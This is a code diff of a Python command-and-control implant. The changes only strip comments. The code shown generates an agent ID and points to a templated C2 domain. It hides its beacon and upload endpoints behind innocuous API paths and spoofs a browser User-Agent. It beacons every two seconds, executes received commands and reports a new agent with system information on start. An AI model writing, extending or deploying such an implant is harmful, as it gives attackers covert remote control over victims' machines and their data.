@@ -7,18 +7,14 @@ import socket
 import os
 import urllib3
 
-# Disable SSL warnings due to self-signed certificates
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Unique agent ID for each implant
 AGENT_ID = str(uuid.uuid4())
 
-# C2 Server URL and endpoints
 C2_BASE      = "https://${c2_domain}"
 GET_ENDPOINT = "/api/v2/status"
 POST_ENDPOINT= "/api/v2/users/update"
 
-# Now that AGENT_ID exists, we can safely put it into our headers
 HEADERS = {
     "Access-X-Control": "000000011110000000",
     "User-Agent":       "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
@@ -27,8 +23,8 @@ HEADERS = {
     "Agent-ID":         AGENT_ID,
 }
 
-SLEEP_INTERVAL = 2   # seconds between beacons
-VERIFY_TLS     = True  # Change to False if you need to skip cert validation
+SLEEP_INTERVAL = 2  
+VERIFY_TLS     = True  
 
 def get_system_info():
     """ Gather basic system info about the agent """
@@ -99,7 +95,6 @@ def execute_command(cmd):
 
 if __name__ == "__main__":
     print("[*] Starting C2 implant…")
-    # Initial “new agent” callback
     send_output("[+] New agent online", info=get_system_info())
 
     last_cmd = None
